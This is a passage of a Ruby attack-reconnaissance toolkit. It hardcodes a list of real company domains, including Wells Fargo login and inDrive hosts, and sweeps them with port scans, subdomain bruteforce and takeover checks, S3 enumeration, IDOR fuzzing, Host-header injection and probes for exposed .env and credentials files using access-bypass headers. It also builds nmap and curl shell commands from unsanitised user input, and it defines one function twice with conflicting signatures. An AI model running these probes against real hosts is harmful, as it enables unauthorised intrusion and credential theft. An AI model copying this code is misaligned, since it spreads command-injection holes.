  else
        # Handle non-success HTTP statuses
    puts "#{BRIGHT_RED}[!] HTTP #{res.code} – failed to fetch directory index#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Batch Scanning Feature for Multiple Targets OPTION 38

# 1. Define your list of targets
TARGETS = [
  'ab-platform-api.eu-east-1.indriverapp.com',
  'alternativa.film',
  'argocd.indrive.dev',
  'auroratechaward.com',
  'auth.indrive.tech',
  'auth2.indrive.tech',
  'festival.alternativa.film',
  'indrive.alternativa.film',
  'priority.eu-east-1.indriverapp.com',
  'wga.volans.tech',
  'https://portal.3cx.com',
  'homeloans.wellsfargo.com',
  'connect.secure.wellsfargo.com',
  'auth.skypicker.com',
  'copperfacejacks.com'
]

# 2. Wrapper for Port Scanning (Service Detection)
def port_scanning_with_service_detection_target(target)
  require 'socket'

  puts "\n#{BRIGHT_GREEN}=== Port Scan (Service Detection) on #{target} ===#{RESET}"
  common_ports = {
    22 => 'SSH', 80 => 'HTTP', 443 => 'HTTPS',
    21 => 'FTP', 25 => 'SMTP', 53 => 'DNS',
    110 => 'POP3', 143 => 'IMAP', 3306 => 'MySQL',
    3389 => 'RDP', 8080 => 'HTTP Proxy'
  }

  open_ports = []

  common_ports.each do |port, service|
    print "#{target}: Checking port #{port} (#{service})... "
    begin
      socket = Socket.tcp(target, port, connect_timeout: 3)
      socket.close
      puts "#{GREEN}open#{RESET}"
      open_ports << "#{port} (#{service})"
    rescue
      puts "#{RED}closed#{RESET}"
    end
  end

  unless open_ports.empty?
    puts "#{BRIGHT_GREEN}Open ports on #{target}: #{open_ports.join(', ')}#{RESET}"
  else
    puts "#{BRIGHT_YELLOW}No open common ports detected on #{target}.#{RESET}"
  end
end

# 3. Save function placeholder
def save_to_file
  # Placeholder for future saving logic (e.g., to JSON or TXT)
  # Could include open ports, discovered services, timestamps, etc.
end

# 4. Batch scan orchestration
def batch_scan
  TARGETS.each do |t|
    puts "\n#{BRIGHT_CYAN}=== Batch Scan: #{t} ===#{RESET}"
    
    # 4.a Port scan
    host = t.gsub(%r{https?://}, '') # Strip scheme if present
    port_scanning_with_service_detection_target(host)

    # 4.b Future: HTTPS analysis
    # https_analysis_target(t)

    # 4.c Future: Domain info
    # domain_info_gather_target(t)

    # 4.d Future: Directory bruteforcer
    # directory_bruteforcer_sensitive_target(t)

    # 4.e Future: XSS scanner
    # xss_scanner_target(t)

    # 4.f Future: SQL Injection test
    # sql_injection_test_target("http://#{t}/page?id=1")

    # 4.g Save intermediate results
    save_to_file
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# DNS Bruteforce (39.)
require 'resolv'
require 'concurrent'

def dns_bruteforce_subdomains
  print "\n#{BRIGHT_GREEN}Enter domain to bruteforce: #{RESET}"
  domain = gets.chomp.strip.downcase

  print "#{BRIGHT_GREEN}Enter wordlist path: #{RESET}"
  wl = gets.chomp.strip

  unless File.exist?(wl)
    puts "\n#{BRIGHT_RED}[!] Wordlist not found: #{wl}#{RESET}"
    return
  end

  words = File.readlines(wl).map(&:strip).reject(&:empty?)
  puts "\n#{BRIGHT_YELLOW}[*] Bruteforcing #{words.size} subdomains on #{domain}...#{RESET}"

  live = Concurrent::Array.new
  pool = Concurrent::FixedThreadPool.new(20)

  words.each do |w|
    pool.post do
      host = "#{w}.#{domain}"
      begin
        ips = Resolv.getaddresses(host)
        if ips.any?
          live << { host: host, ips: ips }
          puts "#{GREEN}[+] #{host}#{RESET} → #{ips.join(', ')}"
        end
      rescue Resolv::ResolvError
        # silently ignore failed lookups
      end
    end
  end

  pool.shutdown
  pool.wait_for_termination

  # Ensure $gathered_data is initialized
  $gathered_data ||= {}
  $gathered_data[:dns_bruteforce] ||= {}
  $gathered_data[:dns_bruteforce][domain] = live

  puts "\n#{BRIGHT_GREEN}✔ Bruteforce complete. Found #{live.size} live subdomains.#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Subdomain-Takeover Check (40.)
require 'net/http'
require 'uri'
require 'openssl'

def subdomain_takeover_scan
  subs = $gathered_data.dig(:dns_bruteforce)&.values&.flatten&.map { |h| h[:host] } || []

  if subs.empty?
    puts "#{BRIGHT_RED}[!] No subdomains found. Run DNS bruteforce first.#{RESET}"
    return
  end

  puts "\n#{BRIGHT_GREEN}=== Subdomain Takeover Scan ===#{RESET}"
  puts "#{BRIGHT_YELLOW}[*] Checking takeover potential on #{subs.size} subdomains...#{RESET}"

  $gathered_data[:takeover_candidates] ||= []

  subs.each do |sub|
    begin
      uri = URI("http://#{sub}")
      http = Net::HTTP.new(uri.host, uri.port)
      http.open_timeout = 5
      http.read_timeout = 5
      req = Net::HTTP::Get.new(uri)
      res = http.request(req)
      body = res.body.to_s.downcase

      if res.code.to_i == 404 || body.include?("no such bucket") || body.include?("does not exist") || body.include?("not found") || body.include?("error code: nx_domain")
        puts "#{RED}[!] Potential Takeover:#{RESET} #{sub} (HTTP #{res.code})"
        $gathered_data[:takeover_candidates] << { sub: sub, status: res.code }
      end
    rescue => e
      puts "#{YELLOW}[!] Skipping #{sub}: #{e.class}#{RESET}"
    end
  end

  count = $gathered_data[:takeover_candidates].size
  puts "\n#{BRIGHT_GREEN}[+] Takeover scan complete. #{count} potential candidates found.#{RESET}"
end
#----------------------------------------------------------------------------------------------------------------------------------------
# S3 Bucket Enumeration (41.)
require 'net/http'
require 'uri'
require 'openssl'

def s3_bucket_enum
  puts "\n#{BRIGHT_GREEN}=== S3 Bucket Enumeration ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter base bucket name (without .s3.amazonaws.com): #{RESET}"
  bucket = gets.chomp.strip

  url = "https://#{bucket}.s3.amazonaws.com/"
  puts "#{BRIGHT_YELLOW}[*] Checking S3 bucket:#{RESET} #{url}"

  begin
    uri  = URI(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.open_timeout = 5
    http.read_timeout = 5

    req = Net::HTTP::Get.new(uri.request_uri)
    res = http.request(req)

    code = res.code.to_i

    if code.between?(200, 299)
      puts "#{BRIGHT_GREEN}[+] Public bucket accessible: #{url} (HTTP #{code})#{RESET}"
      # Optional: parse XML listing if needed
    elsif code == 403
      puts "#{YELLOW}[-] Bucket exists but is not publicly listable (HTTP 403)#{RESET}"
    elsif code == 404
      puts "#{RED}[!] Bucket does not exist or is unreachable (HTTP 404)#{RESET}"
    else
      puts "#{RED}[!] Unexpected HTTP status: #{code}#{RESET}"
    end

    # Save result to gathered_data
    $gathered_data[:s3_buckets] ||= {}
    $gathered_data[:s3_buckets][bucket] = code

  rescue => e
    puts "#{RED}[!] Error querying bucket: #{e.class} – #{e.message}#{RESET}"
    $gathered_data[:s3_buckets] ||= {}
    $gathered_data[:s3_buckets][bucket] = 'error'
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# JWT Inspector (42.)
require 'base64'
require 'json'

def jwt_decode
  puts "\n#{BRIGHT_GREEN}=== JWT Token Inspector ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter JWT token: #{RESET}"
  token = gets.chomp.strip

  parts = token.split('.')
  unless parts.size == 3
    puts "#{BRIGHT_RED}[!] Invalid JWT format. Expecting 3 parts separated by dots.#{RESET}"
    return
  end

  begin
    # Proper base64url decoding with padding
    header_json = Base64.urlsafe_decode64(parts[0].ljust((parts[0].length + 3) & ~3, '='))
    payload_json = Base64.urlsafe_decode64(parts[1].ljust((parts[1].length + 3) & ~3, '='))

    header = JSON.parse(header_json)
    payload = JSON.parse(payload_json)

    puts "#{BRIGHT_YELLOW}--- Decoded Header ---#{RESET}"
    puts JSON.pretty_generate(header)

    puts "#{BRIGHT_YELLOW}--- Decoded Payload ---#{RESET}"
    puts JSON.pretty_generate(payload)

  rescue JSON::ParserError => e
    puts "#{BRIGHT_RED}[!] Failed to parse JWT JSON: #{e.message}#{RESET}"
  rescue ArgumentError => e
    puts "#{BRIGHT_RED}[!] Invalid Base64 encoding: #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# AES-CBC Decrypt (43.)
require 'openssl'
require 'base64'

def aes_cbc_decrypt
  puts "\n#{BRIGHT_GREEN}=== AES-CBC Decryption Tool ===#{RESET}"
  print "#{BRIGHT_CYAN}Ciphertext (Base64): #{RESET}"
  ct_b64 = gets.chomp.strip

  print "#{BRIGHT_CYAN}Key (hex): #{RESET}"
  key_hex = gets.chomp.strip
  key = [key_hex].pack('H*')

  print "#{BRIGHT_CYAN}IV (hex): #{RESET}"
  iv_hex = gets.chomp.strip
  iv = [iv_hex].pack('H*')

  # AES key must be 16, 24, or 32 bytes
  unless [16, 24, 32].include?(key.bytesize)
    puts "#{BRIGHT_RED}[!] Invalid key length: #{key.bytesize} bytes. Must be 16, 24, or 32.#{RESET}"
    return
  end

  begin
    cipher = OpenSSL::Cipher.new("AES-#{key.bytesize * 8}-CBC")
    cipher.decrypt
    cipher.key = key
    cipher.iv  = iv
    plaintext = cipher.update(Base64.decode64(ct_b64)) + cipher.final
    puts "#{BRIGHT_YELLOW}Decrypted Plaintext:#{RESET} #{plaintext}"
  rescue => e
    puts "#{BRIGHT_RED}[!] Decryption failed: #{e.class} – #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# Nmap NSE Vulnerability Scan (44.)
def nmap_nse_vuln_scan
  puts "\n#{BRIGHT_GREEN}=== Nmap NSE Vulnerability Scan ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter target (IP or hostname): #{RESET}"
  tgt = gets.chomp.strip

  if tgt.empty?
    puts "#{BRIGHT_RED}[!] No target entered. Aborting.#{RESET}"
    return
  end

  unless system("which nmap > /dev/null 2>&1")
    puts "#{BRIGHT_RED}[!] Nmap is not installed or not found in PATH.#{RESET}"
    return
  end

  output_file = "nmap-vuln-#{tgt.gsub(/[^a-zA-Z0-9\.\-_]/, '_')}.xml"
  puts "#{BRIGHT_YELLOW}[*] Running scan and saving output to: #{output_file}#{RESET}"

  cmd = "nmap -Pn -sV --script vuln #{tgt} -oX #{output_file}"
  puts "#{BRIGHT_GREEN}→ Executing: #{cmd}#{RESET}"

  system(cmd)

  if File.exist?(output_file)
    puts "#{BRIGHT_GREEN}[+] Nmap scan complete. Results saved in #{output_file}#{RESET}"
  else
    puts "#{BRIGHT_RED}[!] Nmap did not generate output. Check target or permissions.#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 45: HTTPS Handshake Debug
def https_handshake_debug
  require 'openssl'
  require 'socket'
  require 'timeout'

  puts "\n#{BRIGHT_GREEN}=== HTTPS Handshake Debug ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter host: #{RESET}"
  host = gets.chomp.strip

  print "#{BRIGHT_CYAN}Enter port (default 443): #{RESET}"
  port_input = gets.chomp.strip
  port = (port_input.empty? ? 443 : port_input.to_i)

  print "#{BRIGHT_CYAN}Enter timeout seconds (default 10): #{RESET}"
  timeout_input = gets.chomp.strip
  timeout_sec = (timeout_input.empty? ? 10 : timeout_input.to_i)

  if host.empty?
    puts "#{BRIGHT_RED}[!] Host is required. Aborting.#{RESET}"
    return
  end

  begin
    Timeout.timeout(timeout_sec) do
      tcp = TCPSocket.new(host, port)
      ctx = OpenSSL::SSL::SSLContext.new
      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
      ssl = OpenSSL::SSL::SSLSocket.new(tcp, ctx)
      ssl.hostname = host
      ssl.connect

      cert = ssl.peer_cert
      puts "#{GREEN}[+] Connected successfully to #{host}:#{port}#{RESET}"
      puts "#{YELLOW}→ Certificate Subject:#{RESET} #{cert.subject}"
      puts "#{YELLOW}→ Issuer:#{RESET} #{cert.issuer}"
      puts "#{YELLOW}→ Valid From:#{RESET} #{cert.not_before}"
      puts "#{YELLOW}→ Valid Until:#{RESET} #{cert.not_after}"
      puts "#{YELLOW}→ Serial:#{RESET} #{cert.serial}"
      puts "#{YELLOW}→ Signature Algorithm:#{RESET} #{cert.signature_algorithm}"

      ssl.close
      tcp.close
    end
  rescue Timeout::Error
    puts "#{RED}[!] Handshake timeout after #{timeout_sec} seconds.#{RESET}"
  rescue => e
    puts "#{RED}[!] Handshake failed: #{e.class} – #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 46: NGINX Stub Status Enumerator
def nginx_status_check
  require 'net/http'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== NGINX Stub Status Enumerator ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter target host (e.g., example.com): #{RESET}"
  host = gets.chomp.strip

  unless host.match?(/\A[a-z0-9\.\-]+\z/i)
    puts "#{BRIGHT_RED}[!] Invalid hostname.#{RESET}"
    return
  end

  paths = ['/nginx_status', '/status', '/stub_status']
  found = false

  paths.each do |path|
    begin
      uri = URI("http://#{host}#{path}")
      res = Net::HTTP.get_response(uri)
      if res.code.to_i == 200 && res.body.match?(/active connections/i)
        puts "#{BRIGHT_GREEN}[+] NGINX stub_status exposed at:#{RESET} #{path}"
        puts "#{YELLOW}--- Preview ---#{RESET}"
        puts res.body.lines.first(5).map { |l| "  #{l.strip}" }
        found = true
      end
    rescue => e
      puts "#{RED}[-] Failed to reach #{uri} → #{e.class}#{RESET}"
    end
  end

  puts "#{BRIGHT_YELLOW}[!] No exposed stub_status endpoints detected.#{RESET}" unless found
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 47: WebDAV Method Probe
def webdav_method_probe
  require 'net/http'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== WebDAV Method Probe ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter target host (e.g., example.com): #{RESET}"
  host = gets.chomp.strip

  begin
    uri = URI("http://#{host}/")
  rescue => e
    puts "#{BRIGHT_RED}[!] Invalid URI: #{e.message}#{RESET}"
    return
  end

  methods = %w[OPTIONS PROPFIND PUT DELETE]
  methods.each do |method|
    begin
      # Create a generic HTTP request with custom method
      req = Net::HTTPGenericRequest.new(method, true, true, uri.request_uri)
      http = Net::HTTP.new(uri.host, uri.port)
      http.open_timeout = 5
      http.read_timeout = 5
      res = http.request(req)

      code = res.code.to_i
      color = case code
              when 200..299 then GREEN
              when 300..399 then YELLOW
              else RED
              end
      puts "#{color}#{method.ljust(8)} → HTTP #{code}#{RESET} | Allow: #{res['Allow'] || 'N/A'}"
    rescue => e
      puts "#{RED}#{method.ljust(8)} → Error: #{e.class} (#{e.message})#{RESET}"
    end
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 48: NGINX Version Fingerprinter
def nginx_version_fingerprint
  require 'net/http'
  require 'uri'

  puts "\n#{BRIGHT_GREEN}=== NGINX Version Fingerprinter ===#{RESET}"
  print "#{BRIGHT_CYAN}Enter target host (e.g., example.com): #{RESET}"
  host = gets.chomp.strip

  begin
    uri = URI("http://#{host}/")
  rescue => e
    puts "#{BRIGHT_RED}[!] Invalid URI: #{e.message}#{RESET}"
    return
  end

  begin
    http = Net::HTTP.new(uri.host, uri.port)
    http.open_timeout = 5
    http.read_timeout = 5
    res = http.get(uri.request_uri)

    server_header = res['Server']
    if server_header
      puts "#{BRIGHT_YELLOW}[+] Server header found:#{RESET} #{server_header}"
      if server_header.downcase.include?("nginx")
        puts "#{BRIGHT_GREEN}[✓] NGINX detected.#{RESET}"
        if server_header =~ /nginx\/([\d.]+)/
          puts "#{BRIGHT_CYAN}[i] Version: #{$1}#{RESET}"
        else
          puts "#{BRIGHT_YELLOW}[!] Version not disclosed (custom or hardened header)#{RESET}"
        end
      else
        puts "#{BRIGHT_RED}[✘] NGINX not detected in Server header.#{RESET}"
      end
    else
      puts "#{BRIGHT_RED}[!] Server header missing.#{RESET}"
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] Error fetching header: #{e.class} – #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# 49: Advanced SSL/TLS and Server Info Scan
def analyze_target_tls_and_headers(target_host, port = 443)
  require 'socket'
  require 'openssl'
  require 'timeout'
  require 'net/http'
  require 'uri'

  section_header("49) SSL/TLS & HTTP Header Scan")

  begin
    Timeout.timeout(10) do
      tcp = TCPSocket.new(target_host, port)
      ctx = OpenSSL::SSL::SSLContext.new
      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
      ssl = OpenSSL::SSL::SSLSocket.new(tcp, ctx)
      ssl.hostname = target_host
      ssl.connect

      puts "#{BRIGHT_GREEN}[+] Connected to #{target_host}:#{port}#{RESET}"
      puts "#{BRIGHT_YELLOW}→ SSL/TLS Version: #{ssl.ssl_version}#{RESET}"

      cipher = ssl.cipher
      puts "#{BRIGHT_YELLOW}→ Cipher: #{cipher[0]} (#{cipher[1]} bits)#{RESET}"

      cert = ssl.peer_cert
      puts "#{BRIGHT_CYAN}→ Certificate Subject:#{RESET} #{cert.subject}"
      puts "#{BRIGHT_CYAN}→ Certificate Issuer: #{RESET} #{cert.issuer}"
      puts "#{BRIGHT_CYAN}→ Signature Algorithm:#{RESET} #{cert.signature_algorithm}"
      puts "#{BRIGHT_CYAN}→ Valid From:         #{RESET} #{cert.not_before}"
      puts "#{BRIGHT_CYAN}→ Valid Until:        #{RESET} #{cert.not_after}"
      puts "#{BRIGHT_CYAN}→ Serial Number:      #{RESET} #{cert.serial}"

      key = cert.public_key
      key_type =
        case key
        when OpenSSL::PKey::RSA then "RSA"
        when OpenSSL::PKey::DSA then "DSA"
        when OpenSSL::PKey::EC  then "Elliptic Curve"
        else "Unknown"
        end
      puts "#{BRIGHT_CYAN}→ Public Key Type:    #{RESET} #{key_type}"

      if key.respond_to?(:n)
        puts "#{BRIGHT_CYAN}→ Public Key Size:    #{RESET} #{key.n.num_bits} bits"
      elsif key.respond_to?(:group)
        puts "#{BRIGHT_CYAN}→ Public Key Curve:   #{RESET} #{key.group.curve_name}"
      else
        puts "#{BRIGHT_YELLOW}[!] Public key details not available.#{RESET}"
      end

      ssl.sysclose
      tcp.close
    end
  rescue Timeout::Error
    puts "#{BRIGHT_RED}[!] SSL handshake timeout after 10s#{RESET}"
  rescue => e
    puts "#{BRIGHT_RED}[!] SSL/TLS Scan Failed: #{e.class} – #{e.message}#{RESET}"
  end

  # ================= HTTP Headers =================
  begin
    uri = URI("https://#{target_host}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.open_timeout = 5
    http.read_timeout = 5

    response = http.start { |h| h.head('/') }

    puts "\n#{BRIGHT_GREEN}=== HTTP(S) Response Headers ===#{RESET}"
    response.each_header do |key, val|
      puts "#{BRIGHT_YELLOW}→ #{key.capitalize}:#{RESET} #{val}"
    end
  rescue => e
    puts "#{BRIGHT_RED}[!] Failed to fetch HTTP headers: #{e.class} – #{e.message}#{RESET}"
  end
end
# -------------------------------------------------------------------------
# 50: CloudFront Misconfiguration Scanner
def cloudfront_misconfig_scan(target_host)
  require 'net/http'
  require 'uri'
  require 'json'

  section_header("50) CloudFront Misconfiguration Scan for #{target_host}")
  uri = URI("https://#{target_host}")
  headers = {}
  results = { target: target_host, headers: {}, status: nil }

  begin
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.open_timeout = 5
    http.read_timeout = 5

    req = Net::HTTP::Get.new(uri.request_uri)
    req['Host'] = target_host  # Simulate Host header override (for CloudFront origin tests)

    res = http.request(req)

    puts "#{BRIGHT_GREEN}[+] Response Code: #{res.code}#{RESET}"
    results[:status] = res.code.to_i

    res.each_header do |key, value|
      if key.downcase.include?('cloudfront') || key.start_with?('x-amz', 'via', 'x-cache')
        puts "#{BRIGHT_YELLOW}→ #{key}:#{RESET} #{value}"
        headers[key] = value
      end
    end

    results[:headers] = headers

    case res.code.to_i
    when 403
      puts "#{BRIGHT_RED}[!] Host override rejected (403 Forbidden) – likely secure.#{RESET}"
    when 500..599
      puts "#{BRIGHT_RED}[!] Server error – possible internal misrouting or origin misconfig.#{RESET}"
    else
      puts "#{BRIGHT_GREEN}[+] CloudFront endpoint appears responsive.#{RESET}"
    end

    File.open("cloudfront_scan_results.json", "a") do |f|
      f.puts(JSON.pretty_generate(results))
    end

  rescue => e
    puts "#{BRIGHT_RED}[!] CloudFront scan failed: #{e.class} – #{e.message}#{RESET}"
  end
end
# -------------------------------------------------------------------------
# 51: Subdomain Takeover Detector (Using existing wordlist from Func 39)
def subdomain_takeover_scan(base_domain)
  require 'resolv'
  require 'json'

  section_header("51) Subdomain Takeover Scan for #{base_domain}")

  known_takeover_services = {
    "s3.amazonaws.com"      => "AWS S3",
    "github.io"             => "GitHub Pages",
    "herokuapp.com"         => "Heroku",
    "readme.io"             => "Readme",
    "surge.sh"              => "Surge",
    "unbouncepages.com"     => "Unbounce",
    "cloudfront.net"        => "CloudFront",
    "fastly.net"            => "Fastly",
    "netlify.app"           => "Netlify",
    "frontify.com"          => "Frontify",
    "bitbucket.io"          => "Bitbucket Pages",
    "pantheonsite.io"       => "Pantheon",
    "helpjuice.com"         => "Helpjuice",
    "zendesk.com"           => "Zendesk",
    "statuspage.io"         => "Atlassian StatusPage"
  }

  wordlist = %w[www media cdn static app blog staging dev api files uploads content]
  findings = []

  wordlist.each do |sub|
    full_sub = "#{sub}.#{base_domain}"
    begin
      cname = Resolv::DNS.open do |dns|
        resources = dns.getresources(full_sub, Resolv::DNS::Resource::IN::CNAME)
        resources.first&.name&.to_s
      end

      if cname
        matched = known_takeover_services.find { |sig, _| cname.include?(sig) }
        if matched
          puts "#{BRIGHT_GREEN}[+] #{full_sub} → #{cname} (#{matched[1]})#{RESET}"
          findings << {
            subdomain: full_sub,
            cname: cname,
            provider: matched[1],
            status: "Potential Takeover"
          }
        else
          puts "#{YELLOW}[i] #{full_sub} → #{cname} (unknown or safe)#{RESET}"
        end
      else
        puts "#{RED}[✗] No CNAME record found for #{full_sub}#{RESET}"
      end

    rescue => e
      puts "#{BRIGHT_RED}[!] Error resolving #{full_sub}: #{e.class} – #{e.message}#{RESET}"
    end
  end

  if findings.any?
    File.open("subdomain_takeover_results.json", "a") do |f|
      f.puts(JSON.pretty_generate({ base_domain: base_domain, findings: findings }))
    end
    puts "\n#{BRIGHT_GREEN}[✓] Findings saved to subdomain_takeover_results.json#{RESET}"
  else
    puts "\n#{YELLOW}No takeover candidates found for #{base_domain}.#{RESET}"
  end
end
# ----------------------------------------------------------------------------------------------------------------------------------------
# 52: CNAME Takeover Verifier
def cname_takeover_verifier
  section_header("52) Manual CNAME Takeover Verifier")

  print "#{BRIGHT_CYAN}Enter the full subdomain (e.g., media.example.com): #{RESET}"
  subdomain = gets.chomp.strip

  print "#{BRIGHT_CYAN}Enter the CNAME target (e.g., yourproject.hostingprovider.com): #{RESET}"
  cname_target = gets.chomp.strip

  puts "\n#{BRIGHT_YELLOW}Checking potential takeover for #{subdomain} via #{cname_target}...#{RESET}"

  begin
    uri = URI("https://#{subdomain}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.open_timeout = http.read_timeout = 8

    response = http.get(uri.request_uri)
    code = response.code.to_i
    body = response.body.to_s.downcase

    vulnerable_signatures = [
      "no such project", "no such app", "no such bucket", "does not exist",
      "project not found", "unknown domain", "there isn't a github pages site here",
      "404 not found", "non-existent domain", "heroku | no such app", "not found"
    ]

    matched = vulnerable_signatures.any? { |sig| body.include?(sig) }

    if code == 404 || matched
      puts "#{BRIGHT_RED}[!] #{subdomain} appears unclaimed — TAKEOVER POSSIBLE!#{RESET}"
      puts "    → CNAME Target: #{cname_target}"
    else
      puts "#{BRIGHT_GREEN}[+] #{subdomain} seems claimed or protected.#{RESET}"
      puts "    → Status Code: #{code}"
    end

  rescue => e
    puts "#{BRIGHT_RED}[!] Could not reach #{subdomain}: #{e.class} – #{e.message}#{RESET}"
  end
end
#----------------------------------------------------------------------------------------------------------------------------------------
# === Function 53: IDOR Parameter Tester (Updated) ===
def idor_parameter_tester_v2
 print "Enter target host (e.g., example.com): "
  target = gets.chomp.strip
  return puts "[!] Target cannot be empty." if target.empty?

  base_url = "https://#{target}"
  wordlist = [
    "/user/1", "/user/2", "/account/1", "/invoice?id=1",
    "/order?id=1001", "/profile/2", "/download?id=5", "/record/7",
    "/data/view?id=1", "/user/profile?uid=100", "/profile?user=admin",
    "/api/users?id=3", "/api/userinfo/1", "/orders/2023/1",
    "/admin/view?id=1", "/reports?id=2", "/logs/2024/05/01",
    "/session?id=5", "/cart/checkout?user=1", "/purchase/confirm?id=1"
  ]

  # Enhanced fuzzing additions
  wordlist += (1..5).map { |i| "/api/userinfo/#{rand(1000..9999)}" }
  wordlist += ["/account?ref=abc123", "/api/user?id=abcd-#{rand(1000..9999)}"]

  puts "\n=== IDOR Parameter Tester for #{target} ==="

  # Optional Cookie Injection
  print "Use a session cookie? (y/N): "
  use_cookie = gets.chomp.downcase == 'y'
  headers = {}
  if use_cookie
    print "Enter Cookie string (e.g., session=abc123): "
    headers['Cookie'] = gets.chomp
  end

  wordlist.each do |path|
    url = URI.join(base_url, path)
    begin
      start_time = Time.now
      http = Net::HTTP.new(url.host, url.port)
      http.use_ssl = true
      req = Net::HTTP::Get.new(url.request_uri, headers)
      response = http.request(req)
      end_time = Time.now

      code = response.code.to_i
      diff_hint = ""
      if code == 200 && response.body.include?("admin")
        diff_hint = "[!] Potential data leak"
      elsif (end_time - start_time) > 2.0
        diff_hint = "[!] Timing anomaly"
      end

      puts "[#{code}] Checked #{path} #{diff_hint}"

    rescue => e
      puts "[!] Error testing #{path}: #{e.message}"
    end
  end
end
# ----------------------------------------------------------------------------------------------------------------------------------------
# === Function 54: Host Header Injection Tester (Updated for Linux CLI) ===
def host_header_injection_tester_v2
  section_header("54) Host Header Injection Tester")

  print "#{BRIGHT_CYAN}Enter target host (e.g., example.com): #{RESET}"
  target = gets.chomp.strip
  return puts "#{BRIGHT_RED}[!] Invalid target.#{RESET}" if target.empty?

  host_variants = [
    "preview.#{target}", "staging.#{target}", "test-env.#{target}", "dev.#{target}",
    "beta.#{target}", "internal.#{target}", "localhost.#{target}", "127.0.0.1",
    "0.0.0.0", "localhost", "api.#{target}", "admin.#{target}", "cdn.#{target}",
    "test.#{target}", "root.#{target}", "backup.#{target}", "dashboard.#{target}",
    "vpn.#{target}", "auth.#{target}", "login.#{target}"
  ]

  headers_templates = [
    ->(v) {{ 'Host' => v }},
    ->(v) {{ 'X-Forwarded-Host' => v }},
    ->(v) {{ 'X-Host' => v }},
    ->(v) {{ 'X-Forwarded-Server' => v }},
    ->(v) {{ 'X-Original-URL' => "/admin" }},
    ->(v) {{ 'Referer' => "http://#{v}" }},
    ->(v) {{ 'Forwarded' => "host=#{v}" }},
    ->(v) {{ 'X-Forwarded-For' => v }},
    ->(v) {{ 'X-Real-IP' => "127.0.0.1" }},
    ->(v) {{ 'Via' => v }}
  ]

  uri = URI.parse("https://#{target}")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.read_timeout = 8

  host_variants.each do |host_variant|
    headers_templates.each do |template|
      headers = template.call(host_variant)
      request = Net::HTTP::Get.new(uri.request_uri, headers)

      begin
        response = http.request(request)
        status = response.code.to_i

        if status.between?(200, 403)
          puts "#{YELLOW}[#{status}]#{RESET} Host header used: #{host_variant} (#{headers.keys.first})"
        end

        # Reflected in response body or redirect
        if response.body.include?(host_variant) || response['Location']&.include?(host_variant)
          puts "#{BRIGHT_GREEN}[!] Reflection/redirect detected with: #{host_variant} in #{headers.keys.first}#{RESET}"
        end

        # Indicators of restricted or unintended access
        if response.body.downcase.include?("unauthorized") || response.body.downcase.include?("forbidden")
          puts "#{GRAY}[i] Restricted response for #{host_variant}#{RESET}"
        end
      rescue => e
        puts "#{RED}[!] Error: #{host_variant} with #{headers.keys.first} → #{e.class}: #{e.message}#{RESET}"
      end
    end
  end

  puts "\n#{BRIGHT_CYAN}Host Header Injection test completed.#{RESET}"
end
# ----------------------------------------------------------------------------------------------------------------------------------------
# === Function 55: Bash-Based Sensitive File Prober ===
def sensitive_file_prober
  section_header("55) Bash-Based Sensitive File Prober")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  domain = gets.chomp.strip

  targets = [
    "/.env", "/config.json", "/admin/.git/config", "/debug", "/wp-config.php",
    "/server-status", "/local.env", "/credentials.json"
  ]

  headers = [
    'X-Original-URL', 'X-Rewrite-URL', 'X-Custom-IP-Authorization',
    'X-Forwarded-For', 'X-Forwarded-Host'
  ]

  targets.each do |path|
    headers.each do |header_name|
      full_url = "https://#{domain}#{path}"
      puts "#{BRIGHT_YELLOW}[*] Probing: #{full_url} with #{header_name}#{RESET}"

      cmd = %(curl --silent --insecure -i -H "#{header_name}: 127.0.0.1" #{full_url})
      output = `#{cmd}`

      status_line = output.lines.first.to_s.strip
      if status_line =~ /HTTP\/\d+\.\d+\s+2\d{2}/
        puts "#{BRIGHT_GREEN}[+] #{path} MAY BE EXPOSED! (#{status_line})#{RESET}"
      elsif status_line =~ /HTTP\/\d+\.\d+\s+403/
        puts "#{YELLOW}[i] Forbidden access (403) — might still exist: #{path}#{RESET}"
      else
        puts "#{GRAY}[-] Not accessible: #{status_line}#{RESET}"
      end

      puts "#{GRAY}#{'-'*60}#{RESET}"
      sleep(0.3)
    end
  end

  puts "\n#{BRIGHT_CYAN}Sensitive file probing completed.#{RESET}"
end
# ----------------------------------------------------------------------------------------------------------------------------------------
# === Function 56: OpenSSL Certificate + TLS Debugger ===
def tls_debug_inspector
  section_header("56) OpenSSL Certificate + TLS Debugger")

  print "#{BRIGHT_CYAN}Enter target domain (e.g., example.com): #{RESET}"
  domain = gets.chomp.strip
